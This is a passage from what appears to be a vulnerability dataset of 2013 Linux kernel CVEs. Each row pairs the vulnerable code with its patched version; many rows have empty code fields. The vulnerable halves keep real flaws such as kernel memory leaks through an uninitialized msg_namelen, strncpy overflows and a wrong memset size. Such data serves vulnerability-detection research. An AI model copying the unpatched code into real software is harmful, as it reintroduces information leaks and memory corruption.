 return 1;

"," struct arm_pmu *armpmu = to_arm_pmu(event->pmu);
 struct pmu *leader_pmu = event->group_leader->pmu;

 if (is_software_event(event))
 return 1;

 if (event->pmu != leader_pmu || event->state < PERF_EVENT_STATE_OFF)
 return 1;

"
2013,DoS Mem. Corr. ,CVE-2013-4247,"	pos = full_path + unc_len;

 if (pplen) {
		*pos++ = CIFS_DIR_SEP(cifs_sb);
 strncpy(pos, vol->prepath, pplen);
		pos += pplen;
	}

","	pos = full_path + unc_len;

 if (pplen) {
		*pos = CIFS_DIR_SEP(cifs_sb);
 strncpy(pos + 1, vol->prepath, pplen);
		pos += pplen;
	}

"
2013,DoS ,CVE-2013-4220," */
asmlinkage void bad_mode(struct pt_regs *regs, int reason, unsigned int esr)
{


 console_verbose();

 pr_crit(""Bad mode in %s handler detected, code 0x%08x\n"",
		handler[reason], esr);







 die(""Oops - bad mode"", regs, 0);
 local_irq_disable();
 panic(""bad mode"");
}

void __pte_error(const char *file, int line, unsigned long val)
"," */
asmlinkage void bad_mode(struct pt_regs *regs, int reason, unsigned int esr)
{
 siginfo_t info;
 void __user *pc = (void __user *)instruction_pointer(regs);
 console_verbose();

 pr_crit(""Bad mode in %s handler detected, code 0x%08x\n"",
		handler[reason], esr);
 __show_regs(regs);

	info.si_signo = SIGILL;
	info.si_errno = 0;
	info.si_code  = ILL_ILLOPC;
	info.si_addr  = pc;

 arm64_notify_die(""Oops - bad mode"", regs, &info, 0);


}

void __pte_error(const char *file, int line, unsigned long val)
"
2013,DoS ,CVE-2013-4205,"int unshare_userns(unsigned long unshare_flags, struct cred **new_cred)
{
 struct cred *cred;


 if (!(unshare_flags & CLONE_NEWUSER))
 return 0;

	cred = prepare_creds();
 if (!cred)
 return -ENOMEM;






	*new_cred = cred;
 return create_user_ns(cred);
}

void free_user_ns(struct user_namespace *ns)
","int unshare_userns(unsigned long unshare_flags, struct cred **new_cred)
{
 struct cred *cred;
 int err = -ENOMEM;

 if (!(unshare_flags & CLONE_NEWUSER))
 return 0;

	cred = prepare_creds();
 if (cred) {
		err = create_user_ns(cred);
 if (err)
 put_cred(cred);
 else
			*new_cred = cred;
	}

 return err;

}

void free_user_ns(struct user_namespace *ns)
"
2013,DoS ,CVE-2013-4163," return src ? kmemdup(src, (src->hdrlen + 1) * 8, gfp) : NULL;
}

static void ip6_append_data_mtu(int *mtu,
 int *maxfraglen,
 unsigned int fragheaderlen,
 struct sk_buff *skb,
 struct rt6_info *rt)

{
 if (!(rt->dst.flags & DST_XFRM_TUNNEL)) {
 if (skb == NULL) {
			 * this fragment is not first, the headers
			 * space is regarded as data space.
 */
			*mtu = dst_mtu(rt->dst.path);


		}
		*maxfraglen = ((*mtu - fragheaderlen) & ~7)
			      + fragheaderlen - sizeof(struct frag_hdr);
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct inet_cork *cork;
 struct sk_buff *skb, *skb_prev = NULL;
 unsigned int maxfraglen, fragheaderlen;
 int exthdrlen;
 int dst_exthdrlen;
 int hh_len;
 int mtu;
 int copy;
 int err;
 int offset = 0;
 /* update mtu and maxfraglen if necessary */
 if (skb == NULL || skb_prev == NULL)
 ip6_append_data_mtu(&mtu, &maxfraglen,
						    fragheaderlen, skb, rt);



			skb_prev = skb;

"," return src ? kmemdup(src, (src->hdrlen + 1) * 8, gfp) : NULL;
}

static void ip6_append_data_mtu(unsigned int *mtu,
 int *maxfraglen,
 unsigned int fragheaderlen,
 struct sk_buff *skb,
 struct rt6_info *rt,
 bool pmtuprobe)
{
 if (!(rt->dst.flags & DST_XFRM_TUNNEL)) {
 if (skb == NULL) {
			 * this fragment is not first, the headers
			 * space is regarded as data space.
 */
			*mtu = min(*mtu, pmtuprobe ?
				   rt->dst.dev->mtu :
 dst_mtu(rt->dst.path));
		}
		*maxfraglen = ((*mtu - fragheaderlen) & ~7)
			      + fragheaderlen - sizeof(struct frag_hdr);
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct inet_cork *cork;
 struct sk_buff *skb, *skb_prev = NULL;
 unsigned int maxfraglen, fragheaderlen, mtu;
 int exthdrlen;
 int dst_exthdrlen;
 int hh_len;

 int copy;
 int err;
 int offset = 0;
 /* update mtu and maxfraglen if necessary */
 if (skb == NULL || skb_prev == NULL)
 ip6_append_data_mtu(&mtu, &maxfraglen,
						    fragheaderlen, skb, rt,
						    np->pmtudisc ==
						    IPV6_PMTUDISC_PROBE);

			skb_prev = skb;

"
2013,DoS ,CVE-2013-4162,"extern void udp_err(struct sk_buff *, u32);
extern int udp_sendmsg(struct kiocb *iocb, struct sock *sk,
 struct msghdr *msg, size_t len);

extern void udp_flush_pending_frames(struct sock *sk);
extern int udp_rcv(struct sk_buff *skb);
extern int udp_ioctl(struct sock *sk, int cmd, unsigned long arg);
/*
 * Push out all pending data as one UDP datagram. Socket is locked.
 */
static int udp_push_pending_frames(struct sock *sk)
{
 struct udp_sock  *up = udp_sk(sk);
 struct inet_sock *inet = inet_sk(sk);
	up->pending = 0;
 return err;
}


int udp_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg,
 size_t len)
 struct udphdr *uh;
 struct udp_sock  *up = udp_sk(sk);
 struct inet_sock *inet = inet_sk(sk);
 struct flowi6 *fl6 = &inet->cork.fl.u.ip6;
 int err = 0;
 int is_udplite = IS_UDPLITE(sk);
	__wsum csum = 0;






 /* Grab the skbuff where UDP header space exists. */
 if ((skb = skb_peek(&sk->sk_write_queue)) == NULL)
 goto out;
","extern void udp_err(struct sk_buff *, u32);
extern int udp_sendmsg(struct kiocb *iocb, struct sock *sk,
 struct msghdr *msg, size_t len);
extern int udp_push_pending_frames(struct sock *sk);
extern void udp_flush_pending_frames(struct sock *sk);
extern int udp_rcv(struct sk_buff *skb);
extern int udp_ioctl(struct sock *sk, int cmd, unsigned long arg);
/*
 * Push out all pending data as one UDP datagram. Socket is locked.
 */
int udp_push_pending_frames(struct sock *sk)
{
 struct udp_sock  *up = udp_sk(sk);
 struct inet_sock *inet = inet_sk(sk);
	up->pending = 0;
 return err;
}
EXPORT_SYMBOL(udp_push_pending_frames);

int udp_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg,
 size_t len)
 struct udphdr *uh;
 struct udp_sock  *up = udp_sk(sk);
 struct inet_sock *inet = inet_sk(sk);
 struct flowi6 *fl6;
 int err = 0;
 int is_udplite = IS_UDPLITE(sk);
	__wsum csum = 0;

 if (up->pending == AF_INET)
 return udp_push_pending_frames(sk);

	fl6 = &inet->cork.fl.u.ip6;

 /* Grab the skbuff where UDP header space exists. */
 if ((skb = skb_peek(&sk->sk_write_queue)) == NULL)
 goto out;
"
2013,DoS ,CVE-2013-4129," call_rcu_bh(&p->rcu, br_multicast_free_pg);
		err = 0;

 if (!mp->ports && !mp->mglist &&
 netif_running(br->dev))
 mod_timer(&mp->timer, jiffies);
 break;
 del_timer(&p->timer);
 call_rcu_bh(&p->rcu, br_multicast_free_pg);

 if (!mp->ports && !mp->mglist &&
 netif_running(br->dev))
 mod_timer(&mp->timer, jiffies);

"," call_rcu_bh(&p->rcu, br_multicast_free_pg);
		err = 0;

 if (!mp->ports && !mp->mglist && mp->timer_armed &&
 netif_running(br->dev))
 mod_timer(&mp->timer, jiffies);
 break;
 del_timer(&p->timer);
 call_rcu_bh(&p->rcu, br_multicast_free_pg);

 if (!mp->ports && !mp->mglist && mp->timer_armed &&
 netif_running(br->dev))
 mod_timer(&mp->timer, jiffies);

"
2013,DoS ,CVE-2013-4127,"{
 kref_put(&ubufs->kref, vhost_net_zerocopy_done_signal);
 wait_event(ubufs->wait, !atomic_read(&ubufs->kref.refcount));





 kfree(ubufs);
}

 mutex_unlock(&vq->mutex);

 if (oldubufs) {
 vhost_net_ubuf_put_and_wait(oldubufs);
 mutex_lock(&vq->mutex);
 vhost_zerocopy_signal_used(n, vq);
 mutex_unlock(&vq->mutex);
 rcu_assign_pointer(vq->private_data, oldsock);
 vhost_net_enable_vq(n, vq);
 if (ubufs)
 vhost_net_ubuf_put_and_wait(ubufs);
err_ubufs:
 fput(sock->file);
err_vq:
","{
 kref_put(&ubufs->kref, vhost_net_zerocopy_done_signal);
 wait_event(ubufs->wait, !atomic_read(&ubufs->kref.refcount));
}

static void vhost_net_ubuf_put_wait_and_free(struct vhost_net_ubuf_ref *ubufs)
{
 vhost_net_ubuf_put_and_wait(ubufs);
 kfree(ubufs);
}

 mutex_unlock(&vq->mutex);

 if (oldubufs) {
 vhost_net_ubuf_put_wait_and_free(oldubufs);
 mutex_lock(&vq->mutex);
 vhost_zerocopy_signal_used(n, vq);
 mutex_unlock(&vq->mutex);
 rcu_assign_pointer(vq->private_data, oldsock);
 vhost_net_enable_vq(n, vq);
 if (ubufs)
 vhost_net_ubuf_put_wait_and_free(ubufs);
err_ubufs:
 fput(sock->file);
err_vq:
"
2013,DoS ,CVE-2013-4125," return ln;
}







/*
 *	Insert routing information in a node.
 */
 int add = (!info->nlh ||
		   (info->nlh->nlmsg_flags & NLM_F_CREATE));
 int found = 0;


	ins = &fn->leaf;

			 * To avoid long list, we only had siblings if the
			 * route have a gateway.
 */
 if (rt->rt6i_flags & RTF_GATEWAY &&
			    !(rt->rt6i_flags & RTF_EXPIRES) &&
			    !(iter->rt6i_flags & RTF_EXPIRES))
				rt->rt6i_nsiblings++;
		}

 /* Find the first route that have the same metric */
		sibling = fn->leaf;
 while (sibling) {
 if (sibling->rt6i_metric == rt->rt6i_metric) {

 list_add_tail(&rt->rt6i_siblings,
					      &sibling->rt6i_siblings);
 break;
"," return ln;
}

static inline bool rt6_qualify_for_ecmp(struct rt6_info *rt)
{
 return (rt->rt6i_flags & (RTF_GATEWAY|RTF_ADDRCONF|RTF_DYNAMIC)) ==
	       RTF_GATEWAY;
}

/*
 *	Insert routing information in a node.
 */
 int add = (!info->nlh ||
		   (info->nlh->nlmsg_flags & NLM_F_CREATE));
 int found = 0;
 bool rt_can_ecmp = rt6_qualify_for_ecmp(rt);

	ins = &fn->leaf;

			 * To avoid long list, we only had siblings if the
			 * route have a gateway.
 */
 if (rt_can_ecmp &&
 rt6_qualify_for_ecmp(iter))

				rt->rt6i_nsiblings++;
		}

 /* Find the first route that have the same metric */
		sibling = fn->leaf;
 while (sibling) {
 if (sibling->rt6i_metric == rt->rt6i_metric &&
 rt6_qualify_for_ecmp(sibling)) {
 list_add_tail(&rt->rt6i_siblings,
					      &sibling->rt6i_siblings);
 break;
"
2013,DoS ,CVE-2013-3302,"
	*sent = 0;

 if (ssocket == NULL)
 return -ENOTSOCK; /* BB eventually add reconnect code here */

	smb_msg.msg_name = (struct sockaddr *) &server->dstaddr;
	smb_msg.msg_namelen = sizeof(struct sockaddr);
	smb_msg.msg_control = NULL;
 struct socket *ssocket = server->ssocket;
 int val = 1;




 cFYI(1, ""Sending smb: smb_len=%u"", smb_buf_length);
 dump_smb(iov[0].iov_base, iov[0].iov_len);

","
	*sent = 0;




	smb_msg.msg_name = (struct sockaddr *) &server->dstaddr;
	smb_msg.msg_namelen = sizeof(struct sockaddr);
	smb_msg.msg_control = NULL;
 struct socket *ssocket = server->ssocket;
 int val = 1;

 if (ssocket == NULL)
 return -ENOTSOCK;

 cFYI(1, ""Sending smb: smb_len=%u"", smb_buf_length);
 dump_smb(iov[0].iov_base, iov[0].iov_len);

"
2013,DoS ,CVE-2013-3301," size_t cnt, loff_t *ppos);
ssize_t ftrace_notrace_write(struct file *file, const char __user *ubuf,
 size_t cnt, loff_t *ppos);
loff_t ftrace_regex_lseek(struct file *file, loff_t offset, int whence);
int ftrace_regex_release(struct inode *inode, struct file *file);

void __init
}

loff_t
ftrace_regex_lseek(struct file *file, loff_t offset, int whence)
{
 loff_t ret;

	.open = ftrace_filter_open,
	.read = seq_read,
	.write = ftrace_filter_write,
	.llseek = ftrace_regex_lseek,
	.release = ftrace_regex_release,
};

static const struct file_operations ftrace_notrace_fops = {
	.open = ftrace_notrace_open,
	.read = seq_read,
	.write = ftrace_notrace_write,
	.llseek = ftrace_regex_lseek,
	.release = ftrace_regex_release,
};

	.open		= ftrace_graph_open,
	.read		= seq_read,
	.write		= ftrace_graph_write,

	.release	= ftrace_graph_release,
	.llseek		= seq_lseek,
};
#endif /* CONFIG_FUNCTION_GRAPH_TRACER */

	.open		= ftrace_pid_open,
	.write		= ftrace_pid_write,
	.read		= seq_read,
	.llseek		= seq_lseek,
	.release	= ftrace_pid_release,
};

	.open = stack_trace_filter_open,
	.read = seq_read,
	.write = ftrace_filter_write,
	.llseek = ftrace_regex_lseek,
	.release = ftrace_regex_release,
};

"," size_t cnt, loff_t *ppos);
ssize_t ftrace_notrace_write(struct file *file, const char __user *ubuf,
 size_t cnt, loff_t *ppos);
loff_t ftrace_filter_lseek(struct file *file, loff_t offset, int whence);
int ftrace_regex_release(struct inode *inode, struct file *file);

void __init
}

loff_t
ftrace_filter_lseek(struct file *file, loff_t offset, int whence)
{
 loff_t ret;

	.open = ftrace_filter_open,
	.read = seq_read,
	.write = ftrace_filter_write,
	.llseek = ftrace_filter_lseek,
	.release = ftrace_regex_release,
};

static const struct file_operations ftrace_notrace_fops = {
	.open = ftrace_notrace_open,
	.read = seq_read,
	.write = ftrace_notrace_write,
	.llseek = ftrace_filter_lseek,
	.release = ftrace_regex_release,
};

	.open		= ftrace_graph_open,
	.read		= seq_read,
	.write		= ftrace_graph_write,
	.llseek		= ftrace_filter_lseek,
	.release	= ftrace_graph_release,

};
#endif /* CONFIG_FUNCTION_GRAPH_TRACER */

	.open		= ftrace_pid_open,
	.write		= ftrace_pid_write,
	.read		= seq_read,
	.llseek		= ftrace_filter_lseek,
	.release	= ftrace_pid_release,
};

	.open = stack_trace_filter_open,
	.read = seq_read,
	.write = ftrace_filter_write,
	.llseek = ftrace_filter_lseek,
	.release = ftrace_regex_release,
};

"
2013,#NAME?,CVE-2013-3237,"	vsk = vsock_sk(sk);
	err = 0;



 lock_sock(sk);

 if (sk->sk_state != SS_CONNECTED) {
","	vsk = vsock_sk(sk);
	err = 0;

	msg->msg_namelen = 0;

 lock_sock(sk);

 if (sk->sk_state != SS_CONNECTED) {
"
2013,#NAME?,CVE-2013-3236," if (flags & MSG_OOB || flags & MSG_ERRQUEUE)
 return -EOPNOTSUPP;



 /* Retrieve the head sk_buff from the socket's receive queue. */
	err = 0;
	skb = skb_recv_datagram(&vsk->sk, flags, noblock, &err);
 if (err)
 goto out;

	msg->msg_namelen = 0;
 if (msg->msg_name) {
 struct sockaddr_vm *vm_addr;

"," if (flags & MSG_OOB || flags & MSG_ERRQUEUE)
 return -EOPNOTSUPP;

	msg->msg_namelen = 0;

 /* Retrieve the head sk_buff from the socket's receive queue. */
	err = 0;
	skb = skb_recv_datagram(&vsk->sk, flags, noblock, &err);
 if (err)
 goto out;


 if (msg->msg_name) {
 struct sockaddr_vm *vm_addr;

"
2013,#NAME?,CVE-2013-3235," if (addr) {
		addr->family = AF_TIPC;
		addr->addrtype = TIPC_ADDR_ID;

		addr->addr.id.ref = msg_origport(msg);
		addr->addr.id.node = msg_orignode(msg);
		addr->addr.name.domain = 0;	/* could leave uninitialized */
 goto exit;
	}




	timeout = sock_rcvtimeo(sk, flags & MSG_DONTWAIT);
restart:

 goto exit;
	}




	target = sock_rcvlowat(sk, flags & MSG_WAITALL, buf_len);
	timeout = sock_rcvtimeo(sk, flags & MSG_DONTWAIT);

"," if (addr) {
		addr->family = AF_TIPC;
		addr->addrtype = TIPC_ADDR_ID;
 memset(&addr->addr, 0, sizeof(addr->addr));
		addr->addr.id.ref = msg_origport(msg);
		addr->addr.id.node = msg_orignode(msg);
		addr->addr.name.domain = 0;	/* could leave uninitialized */
 goto exit;
	}

 /* will be updated in set_orig_addr() if needed */
	m->msg_namelen = 0;

	timeout = sock_rcvtimeo(sk, flags & MSG_DONTWAIT);
restart:

 goto exit;
	}

 /* will be updated in set_orig_addr() if needed */
	m->msg_namelen = 0;

	target = sock_rcvlowat(sk, flags & MSG_WAITALL, buf_len);
	timeout = sock_rcvtimeo(sk, flags & MSG_DONTWAIT);

"
2013,#NAME?,CVE-2013-3234," skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (srose != NULL) {

		srose->srose_family = AF_ROSE;
		srose->srose_addr   = rose->dest_addr;
		srose->srose_call   = rose->dest_call;
"," skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (srose != NULL) {
 memset(srose, 0, msg->msg_namelen);
		srose->srose_family = AF_ROSE;
		srose->srose_addr   = rose->dest_addr;
		srose->srose_call   = rose->dest_call;
"
2013,#NAME?,CVE-2013-3233,"
 pr_debug(""%p %zu\n"", sk, len);



 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&

 pr_debug(""Datagram socket %d %d\n"", ui_cb->dsap, ui_cb->ssap);


		sockaddr->sa_family = AF_NFC;
		sockaddr->nfc_protocol = NFC_PROTO_NFC_DEP;
		sockaddr->dsap = ui_cb->dsap;
","
 pr_debug(""%p %zu\n"", sk, len);

	msg->msg_namelen = 0;

 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&

 pr_debug(""Datagram socket %d %d\n"", ui_cb->dsap, ui_cb->ssap);

 memset(sockaddr, 0, sizeof(*sockaddr));
		sockaddr->sa_family = AF_NFC;
		sockaddr->nfc_protocol = NFC_PROTO_NFC_DEP;
		sockaddr->dsap = ui_cb->dsap;
"
2013,#NAME?,CVE-2013-3232,"	}

 if (sax != NULL) {
 memset(sax, 0, sizeof(sax));
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);
","	}

 if (sax != NULL) {
 memset(sax, 0, sizeof(*sax));
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);
"
2013,#NAME?,CVE-2013-3231," int target;	/* Read at least this many bytes */
 long timeo;



 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
"," int target;	/* Read at least this many bytes */
 long timeo;

	msg->msg_namelen = 0;

 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
"
2013,#NAME?,CVE-2013-3230,"		lsa->l2tp_addr = ipv6_hdr(skb)->saddr;
		lsa->l2tp_flowinfo = 0;
		lsa->l2tp_scope_id = 0;

 if (ipv6_addr_type(&lsa->l2tp_addr) & IPV6_ADDR_LINKLOCAL)
			lsa->l2tp_scope_id = IP6CB(skb)->iif;
	}
","		lsa->l2tp_addr = ipv6_hdr(skb)->saddr;
		lsa->l2tp_flowinfo = 0;
		lsa->l2tp_scope_id = 0;
		lsa->l2tp_conn_id = 0;
 if (ipv6_addr_type(&lsa->l2tp_addr) & IPV6_ADDR_LINKLOCAL)
			lsa->l2tp_scope_id = IP6CB(skb)->iif;
	}
"
2013,#NAME?,CVE-2013-3229," struct sk_buff *skb, *rskb, *cskb;
 int err = 0;



 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
"," struct sk_buff *skb, *rskb, *cskb;
 int err = 0;

	msg->msg_namelen = 0;

 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
"
2013,#NAME?,CVE-2013-3228,"
 IRDA_DEBUG(4, ""%s()\n"", __func__);



	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
","
 IRDA_DEBUG(4, ""%s()\n"", __func__);

	msg->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
"
2013,#NAME?,CVE-2013-3227," if (m->msg_flags&MSG_OOB)
 goto read_error;



	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
"," if (m->msg_flags&MSG_OOB)
 goto read_error;

	m->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
"
2013,#NAME?,CVE-2013-3226," test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 hci_conn_accept(pi->conn->hcon, 0);
		sk->sk_state = BT_CONFIG;


 release_sock(sk);
 return 0;
"," test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 hci_conn_accept(pi->conn->hcon, 0);
		sk->sk_state = BT_CONFIG;
		msg->msg_namelen = 0;

 release_sock(sk);
 return 0;
"
2013,#NAME?,CVE-2013-3225,"
 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);

 return 0;
	}

","
 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);
		msg->msg_namelen = 0;
 return 0;
	}

"
2013,#NAME?,CVE-2013-3224," if (flags & (MSG_OOB))
 return -EOPNOTSUPP;



	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN)
 return 0;
 return err;
	}

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
"," if (flags & (MSG_OOB))
 return -EOPNOTSUPP;

	msg->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN)
 return 0;
 return err;
	}



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
"
2013,#NAME?,CVE-2013-3223,"		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);


 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,
				&digi, NULL, NULL);
		sax->sax25_family = AF_AX25;
","		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);

 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,
				&digi, NULL, NULL);
		sax->sax25_family = AF_AX25;
"
2013,#NAME?,CVE-2013-3222," struct sk_buff *skb;
 int copied, error = -EINVAL;



 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;

"," struct sk_buff *skb;
 int copied, error = -EINVAL;

	msg->msg_namelen = 0;

 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;

"
2013,#NAME?,CVE-2013-3076," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;



 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);

 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
"," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;

	msg->msg_namelen = 0;

 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);
	msg->msg_namelen = 0;
 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
"
2013,,CVE-2013-2930,"{
 /* The ftrace function trace is allowed only for root. */
 if (ftrace_event_is_function(tp_event) &&
 perf_paranoid_kernel() && !capable(CAP_SYS_ADMIN))
 return -EPERM;

 /* No tracing, just counting, so no obvious leak */
","{
 /* The ftrace function trace is allowed only for root. */
 if (ftrace_event_is_function(tp_event) &&
 perf_paranoid_tracepoint_raw() && !capable(CAP_SYS_ADMIN))
 return -EPERM;

 /* No tracing, just counting, so no obvious leak */
"
2013,Bypass +Info ,CVE-2013-2929,"	regs->loadrs = 0;									\
	regs->r8 = get_dumpable(current->mm);	/* set ""don't zap registers"" flag */		\
	regs->r12 = new_sp - 16;	/* allocate 16 byte scratch area */			\
 if (unlikely(!get_dumpable(current->mm))) { 	\
 /*										\
		 * Zap scratch regs to avoid leaking bits between processes with different	\
		 * uid/privileges.								\
 return (ret > SUID_DUMP_USER) ? SUID_DUMP_ROOT : ret;
}







int get_dumpable(struct mm_struct *mm)
{
 return __get_dumpable(mm->flags);
extern void would_dump(struct linux_binprm *, struct file *);

extern int suid_dumpable;
#define SUID_DUMP_DISABLE 0 /* No setuid dumping */
#define SUID_DUMP_USER 1 /* Dump as user of process */
#define SUID_DUMP_ROOT 2 /* Dump as root */

/* Stack area protections */
#define EXSTACK_DEFAULT 0 /* Whatever the arch defaults to */
extern void set_dumpable(struct mm_struct *mm, int value);
extern int get_dumpable(struct mm_struct *mm);





/* mm flags */
/* dumpable bits */
#define MMF_DUMPABLE 0 /* core dump is permitted */
 if (task->mm)
		dumpable = get_dumpable(task->mm);
 rcu_read_lock();
 if (!dumpable && !ptrace_has_cap(__task_cred(task)->user_ns, mode)) {

 rcu_read_unlock();
 return -EPERM;
	}
","	regs->loadrs = 0;									\
	regs->r8 = get_dumpable(current->mm);	/* set ""don't zap registers"" flag */		\
	regs->r12 = new_sp - 16;	/* allocate 16 byte scratch area */			\
 if (unlikely(get_dumpable(current->mm) != SUID_DUMP_USER)) {	\
 /*										\
		 * Zap scratch regs to avoid leaking bits between processes with different	\
		 * uid/privileges.								\
 return (ret > SUID_DUMP_USER) ? SUID_DUMP_ROOT : ret;
}

/*
 * This returns the actual value of the suid_dumpable flag. For things
 * that are using this for checking for privilege transitions, it must
 * test against SUID_DUMP_USER rather than treating it as a boolean
 * value.
 */
int get_dumpable(struct mm_struct *mm)
{
 return __get_dumpable(mm->flags);
extern void would_dump(struct linux_binprm *, struct file *);

extern int suid_dumpable;




/* Stack area protections */
#define EXSTACK_DEFAULT 0 /* Whatever the arch defaults to */
extern void set_dumpable(struct mm_struct *mm, int value);
extern int get_dumpable(struct mm_struct *mm);

#define SUID_DUMP_DISABLE 0 /* No setuid dumping */
#define SUID_DUMP_USER 1 /* Dump as user of process */
#define SUID_DUMP_ROOT 2 /* Dump as root */

/* mm flags */
/* dumpable bits */
#define MMF_DUMPABLE 0 /* core dump is permitted */
 if (task->mm)
		dumpable = get_dumpable(task->mm);
 rcu_read_lock();
 if (dumpable != SUID_DUMP_USER &&
	    !ptrace_has_cap(__task_cred(task)->user_ns, mode)) {
 rcu_read_unlock();
 return -EPERM;
	}
"
2013,DoS Overflow ,CVE-2013-2899,,
2013,#NAME?,CVE-2013-2898,,
2013,DoS Mem. Corr. ,CVE-2013-2897,,
2013,DoS ,CVE-2013-2896,,
2013,DoS Overflow +Info ,CVE-2013-2895,,
2013,DoS Overflow ,CVE-2013-2894,,
2013,DoS Overflow ,CVE-2013-2893,,
2013,DoS Overflow ,CVE-2013-2892,,
2013,DoS Overflow ,CVE-2013-2891,,
2013,DoS Overflow ,CVE-2013-2890,,
2013,DoS Overflow ,CVE-2013-2889,,
2013,DoS Exec Code Mem. Corr. ,CVE-2013-2888,,
2013,#NAME?,CVE-2013-2852,,
2013,#NAME?,CVE-2013-2851,,
2013,DoS Exec Code Overflow Mem. Corr. ,CVE-2013-2850,"	}
 INIT_LIST_HEAD(&extra_response->er_list);

 strncpy(extra_response->key, key, strlen(key) + 1);
 strncpy(extra_response->value, NOTUNDERSTOOD,
  strlen(NOTUNDERSTOOD) + 1);

 list_add_tail(&extra_response->er_list,
			&param_list->extra_response_list);

 if (phase & PHASE_SECURITY) {
 if (iscsi_check_for_auth_key(key) > 0) {
 char *tmpptr = key + strlen(key);
				*tmpptr = '=';
 kfree(tmpbuf);
 return 1;
			}
#ifndef ISCSI_PARAMETERS_H
#define ISCSI_PARAMETERS_H



struct iscsi_extra_response {
 char key[64];
 char value[32];
 struct list_head er_list;
} ____cacheline_aligned;
","	}
 INIT_LIST_HEAD(&extra_response->er_list);

 strlcpy(extra_response->key, key, sizeof(extra_response->key));
 strlcpy(extra_response->value, NOTUNDERSTOOD,
 sizeof(extra_response->value));

 list_add_tail(&extra_response->er_list,
			&param_list->extra_response_list);

 if (phase & PHASE_SECURITY) {
 if (iscsi_check_for_auth_key(key) > 0) {


 kfree(tmpbuf);
 return 1;
			}
#ifndef ISCSI_PARAMETERS_H
#define ISCSI_PARAMETERS_H

#include <scsi/iscsi_proto.h>

struct iscsi_extra_response {
 char key[KEY_MAXLEN];
 char value[32];
 struct list_head er_list;
} ____cacheline_aligned;
"
2013,#NAME?,CVE-2013-2636,"				port = p->port;
 if (port) {
 struct br_mdb_entry e;

					e.ifindex = port->dev->ifindex;
					e.state = p->state;
 if (p->addr.proto == htons(ETH_P_IP))
 break;

			bpm = nlmsg_data(nlh);

			bpm->ifindex = dev->ifindex;
 if (br_mdb_fill_info(skb, cb, dev) < 0)
 goto out;
 return -EMSGSIZE;

	bpm = nlmsg_data(nlh);

	bpm->family  = AF_BRIDGE;
	bpm->ifindex = dev->ifindex;
	nest = nla_nest_start(skb, MDBA_MDB);
{
 struct br_mdb_entry entry;


	entry.ifindex = port->dev->ifindex;
	entry.addr.proto = group->proto;
	entry.addr.u.ip4 = group->u.ip4;
","				port = p->port;
 if (port) {
 struct br_mdb_entry e;
 memset(&e, 0, sizeof(e));
					e.ifindex = port->dev->ifindex;
					e.state = p->state;
 if (p->addr.proto == htons(ETH_P_IP))
 break;

			bpm = nlmsg_data(nlh);
 memset(bpm, 0, sizeof(*bpm));
			bpm->ifindex = dev->ifindex;
 if (br_mdb_fill_info(skb, cb, dev) < 0)
 goto out;
 return -EMSGSIZE;

	bpm = nlmsg_data(nlh);
 memset(bpm, 0, sizeof(*bpm));
	bpm->family  = AF_BRIDGE;
	bpm->ifindex = dev->ifindex;
